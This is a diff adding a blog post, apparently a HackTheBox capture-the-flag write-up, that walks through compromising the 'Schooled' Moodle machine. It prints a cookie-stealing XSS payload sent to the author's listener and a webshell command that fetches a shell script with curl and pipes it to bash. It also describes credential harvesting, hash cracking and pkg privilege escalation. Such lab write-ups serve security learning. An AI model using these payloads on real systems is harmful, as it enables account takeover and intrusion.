@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Schooled Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Schooled Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Schooled Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Schooled is a Free BSD based machine that was active since April 3rd of 2021 to September 11th, on this machine we will use a XSS vulnerability to steal the cookie of a teacher inside Moodle, once with the privileges of this user we will be able to exploit CVE-2020-14321 to get command execution inside the machine, after we get inside the machine we will get the password of the database inside Moodle’s configuration file, then we will get some hashes from the database and crack them with john, finally we will abuse of pkg to get a shell as root." />
+<meta property="og:description" content="Schooled is a Free BSD based machine that was active since April 3rd of 2021 to September 11th, on this machine we will use a XSS vulnerability to steal the cookie of a teacher inside Moodle, once with the privileges of this user we will be able to exploit CVE-2020-14321 to get command execution inside the machine, after we get inside the machine we will get the password of the database inside Moodle’s configuration file, then we will get some hashes from the database and crack them with john, finally we will abuse of pkg to get a shell as root." />
+<link rel="canonical" href="http://localhost:8000/Schooled" />
+<meta property="og:url" content="http://localhost:8000/Schooled" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/schooled/schooled.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-11T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/schooled/schooled.png" />
+<meta property="twitter:title" content="Schooled Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-09-11T00:00:00-05:00","datePublished":"2021-09-11T00:00:00-05:00","description":"Schooled is a Free BSD based machine that was active since April 3rd of 2021 to September 11th, on this machine we will use a XSS vulnerability to steal the cookie of a teacher inside Moodle, once with the privileges of this user we will be able to exploit CVE-2020-14321 to get command execution inside the machine, after we get inside the machine we will get the password of the database inside Moodle’s configuration file, then we will get some hashes from the database and crack them with john, finally we will abuse of pkg to get a shell as root.","headline":"Schooled Writeup [HTB]","image":"http://localhost:8000/assets/images/schooled/schooled.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Schooled"},"url":"http://localhost:8000/Schooled"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/schooled/schooled.png/../banner.png>
+  
+  <h2>Schooled Writeup [HTB]</h2>
+  <time datetime="2021-09-11T00:00:00-05:00" class="by-line">11 Sep 2021</time>
+  <p>Schooled is a Free BSD based machine that was active since April 3rd of 2021 to September 11th, on this machine we will use a XSS vulnerability to steal the cookie of a teacher inside Moodle, once with the privileges of this user we will be able to exploit CVE-2020-14321 to get command execution inside the machine, after we get inside the machine we will get the password of the database inside Moodle’s configuration file, then we will get some hashes from the database and crack them with john, finally we will abuse of pkg to get a shell as root.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.234
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 33060,80,22, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.234
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span class="s2">"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"</span>
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.<span class="s2">"
+|_    HY000
+
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+</span></code></pre></div></div>
+
+<p>We see three ports open ssh, http and possibly mysql, we start by checking the webpage.</p>
+
+<p><img src="/assets/images/schooled/website.png" alt="" /></p>
+
+<p>It seems like the webpage of a school, at the bottom we see some contact information, there is a domain “schooled.htb”, so we add it to our hosts file.</p>
+
+<p><img src="/assets/images/schooled/contact.png" alt="" /></p>
+
+<p>Then we use ffuf to search for any subdomain.</p>
+
+<p><img src="/assets/images/schooled/ffuf.png" alt="" /></p>
+
+<p>It found moodle, so we add that to our hosts files, and visiting it as we would expect we find a moodle instance.</p>
+
+<p><img src="/assets/images/schooled/moodle.png" alt="" /></p>
+
+<p>We don’t have any account to access to it, but the site allows us to create one, so we fill the register page using a @student.schooled.htb mail, since the site won’t accept another domain for the mail.</p>
+
+<p><img src="/assets/images/schooled/register.png" alt="" /></p>
+
+<p>After exploring the page we find out that we can enroll ourselves to mathematics course (it is located at http://moodle.schooled.htb/moodle/enrol/index.php?id=5). Once inside the course we see a reminder set by a teacher.</p>
+
+<p><img src="/assets/images/schooled/reminder.png" alt="" /></p>
+
+<h1 id="owning-teacher-account">Owning Teacher Account</h1>
+
+<p>The teacher says something interesting, <code class="language-plaintext highlighter-rouge">Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.</code>, we search for any CVE on moodle that could be related to this message, so we go to <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-2105/Moodle.html">https://www.cvedetails.com/vulnerability-list/vendor_id-2105/Moodle.html</a>, and there we find the <a href="https://www.cvedetails.com/cve/CVE-2020-25627/"> CVE-2020-25627</a>, that indicates that MoodleNet Profile field is vulnerable to XSS, the affected versions are 3.9 to 3.9.1, we don’t know the version of moodle that is running so we can just test it, the teacher said that he will be checking the profiles of the enrolled stundents, so we can try to steal his cookies, to do so we edit our profile and set a XSS payload on MoodleNet Profile field, on this case we use <code class="language-plaintext highlighter-rouge">&lt;script&gt; document.write('&lt;img src="http://10.10.16.42:8000/?cookie=' + document.cookie + '"&gt;') &lt;/script&gt;</code>.</p>
+
+<p><img src="/assets/images/schooled/xss.png" alt="" /></p>
+
+<p>We start a python http server, and after waiting some time we get a cookie.</p>
+
+<p><img src="/assets/images/schooled/cookie.png" alt="" /></p>
+
+<p>Now we just need to set that cookie in our browser, and when we recharge the page we will be under Manuel Phillips account.</p>
+
+<p><img src="/assets/images/schooled/teacher.png" alt="" /></p>
+
+<p>Now this part took me a while, if you google for moodle vulnerabilities or similar you will find a <a href="https://www.youtube.com/watch?v=BkEInFI4oIU">video</a> about how to exploit CVE-2020-14321, well I was looking only at the CVE page, and at the time of solving that machine that CVE didn’t appear there, if we access to the CVE page <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14321">directly</a>, we see the next information.</p>
+
+<p><img src="/assets/images/schooled/reservedCVE.png" alt="" /></p>
+
+<p>The CVE is in reserved state, we will find something similar on <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14321">NVD</a> page, so yeah, there are tons of vulnerabilities without a CVE assigned and like on this case, the CVE might not be public, so it’s a good practice to not only look for CVEs when looking for known vulnerabilities.</p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>So the steps to exploit this CVE are:</p>
+<ol>
+  <li>Add ourselves to the course with manager privileges (to do so we just change the rolsetoassign to 1).</li>
+  <li>Add an administrative user as a student in our course.</li>
+  <li>Enter to that teacher profile and impersonate it (this is a default function that moodle offers).</li>
+  <li>With that administrator account edit privileges of manager role (you can find the privileges you want to set on <a href="https://github.com/HoangKien1020/CVE-2020-14321">github</a>).</li>
+  <li>Upload a malicious plugin that will give you command execution (<a href="https://github.com/HoangKien1020/Moodle_RCE">here</a> you can find a typical webshell)</li>
+</ol>
+
+<p>So our obvious target would be the teacher of Information Technology, since his user id is “2”, he is most likely the administrator since he is the first user created on the site (id 1 belongs to guest users), so we reproduce steps 1 to 3. But here we have a problem, we don’t get the button to act as this user after reproducing the steps, probably moodle has a kind of protection that can be set for certain users.</p>
+
+<p><img src="/assets/images/schooled/itteacher.png" alt="" /></p>
+
+<p>So we have to try with the other teachers since it’s possible that there is more than one site administrator, we try the English Literalute teacher, Jamie Borham, and as we see we do have the button to log in as this account.</p>
+
+<p><img src="/assets/images/schooled/englishteacher.png" alt="" /></p>
+
+<p>This account has adminstrative privileges!, if we impersonate the wrong account we will have to log out completely, and we will have to wait again to get a valid cookie through XXS, so now we have to reproduce steps 4 and 5. Once we have installed the plugin we can go to “http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id”, and see our webshell.</p>
+
+<p><img src="/assets/images/schooled/webshell.png" alt="" /></p>
+
+<p>Now we can go with our usual method, host a bash reverse shell file with a python http server, fetch it with curl and pipe it to bash, but if we try to access to <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=curl+10.10.16.42:8000/shell.sh|bash</code>, we won’t get any request, maybe curl is’nt installed?, or maybe it is just not in the PATH, so we execute <code class="language-plaintext highlighter-rouge">find / -name curl</code> in our webshell and we get <code class="language-plaintext highlighter-rouge">/usr/local/bin/curl</code>, the file is there, so now we only need to use it with the absolute path: <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=/usr/local/bin/curl+10.10.16.42:8000/shell.sh|bash</code>, and then we will get a shell in the machine.</p>
+
+<p><img src="/assets/images/schooled/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement">Lateral Movement</h1>
+
+<p>On similar way if we want to stabilize our shell, python3 is not in the path, but using find we find it in “/usr/local/bin/python3”. As always we search for configuration files, since we have Moodle we go to the <a href="https://docs.moodle.org/311/en/Configuration_file">documentation</a>, which point us to config.php, reading that file we find some credentials for the database.</p>
+
+<p><img src="/assets/images/schooled/dbcreds.png" alt="" /></p>
+
+<p>Now we can access to the database, again mysql is not found, so we add “/usr/local/bin/” to our path to stop having these issues. Inside the moodle database we get the hashes of the passwords of all the users inside the mdl_users table.</p>
+
+<p><img src="/assets/images/schooled/passwords.png" alt="" /></p>
+
+<p>The password that is more interesting is the one of administrator, the passwords are hashed with bcrypt, which would take a lot to crack, so I like to try first with some small list hoping to find it there, on this case I use common_roots.txt, if you need some computer power you can use <a href="https://github.com/mxrch/penglab">penglab</a> to use google infrastructure to crack the password, luckily we found the password with common_roots.</p>
+
+<p><img src="/assets/images/schooled/john.png" alt="" /></p>
+
+<p>This password belongs to “jamie”, so we change to that user and retrieve user.txt.</p>
+
+<p><img src="/assets/images/schooled/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Now we check if we can execute anything with sudo.</p>
+
+<p><img src="/assets/images/schooled/sudo.png" alt="" /></p>
+
+<p>We see that we can install anything with <code class="language-plaintext highlighter-rouge">pkg</code>, there is an entry on <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a> of how to abuse this to get command execution as root, so we install fpm in our machine, create a reverse shell file and create a FressBSD package.</p>
+
+<p><img src="/assets/images/schooled/fpm.png" alt="" /></p>
+
+<p>We upload that file, and when we install it we get a shell as root and finish with the machine.</p>
+
+<p><img src="/assets/images/schooled/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#cross-site-scripting"> Cross Site Scripting</a> &nbsp;
+  
+  <a href="/tags.html#moodle"> Moodle</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
